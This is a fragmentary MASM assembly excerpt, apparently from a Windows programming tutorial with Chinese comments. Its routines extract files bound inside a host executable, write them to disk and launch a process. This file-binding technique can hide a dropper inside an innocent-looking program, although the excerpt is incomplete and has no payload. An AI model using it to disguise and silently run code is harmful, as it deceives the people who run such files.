...
_RunThread	proc	uses ebx ecx edx esi edi,\
   ...
   invoke Sleep,1000
   invoke GetStartupInfo,addr stStartUp;拿到当前进程的信息
   invoke CreateProcess,NULL,addr szHost_,NULL,NULL,\;创建个新进程，第一个参数为空，第二个参数就是要执行模块的全路径
              NULL,NORMAL_PRIORITY_CLASS,NULL,NULL,offset stStartUp,offset stProcInfo
   .if eax!=0
       invoke WaitForSingleObject,stProcInfo.hProcess,INFINITE;等待新进程执行完成
...
writeToFile proc _lpDst,_lpFile,_dwSize
  ...
  local @hFile
  pushad
  invoke CreateFile,_lpDst,GENERIC_WRITE,\;创建文件
            FILE_SHARE_READ,\
                0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0
  mov @hFile,eax
  invoke WriteFile,@hFile,_lpFile,_dwSize,addr @dwWritten,NULL;拷贝文件
  invoke CloseHandle,@hFile      
  popad
  ret
writeToFile endp
...
_releaseFiles   proc
  ...
  local @dwBuffer,@lpDst,@hDstFile
   ...
   pushad
   mov eax,dwTotalFile;文件总数
   push eax

   ;打开文件host.exe，写入szBuffer指定的文件,szHost文件全路径
   ...
   .if eax!=INVALID_HANDLE_VALUE
         mov @hFile,eax
        invoke GetFileSize,eax,NULL;文件大小
        mov @dwFileSize,eax
        .if eax
   ...
   mov ecx,dwTotalFile;绑定文件总数
   mov esi,offset lpFileList;绑定文件结构体数组
   .repeat
      assume esi:ptr BinderFileStruct;假设esi为绑定文件结构体
      push esi
      ...
      ;创建文件名所在的所有子目录
      pushad
      invoke RtlZeroMemory,addr szBuffer,256;清空一片内存
      popad
      invoke _createAllDir,addr [esi].name1;创建文件夹及子文件夹
   
      ;将指定位置的数据拷贝到文件中
      pushad
      invoke GetCurrentDirectory,256,addr szPath  ;获取当前文件夹路径
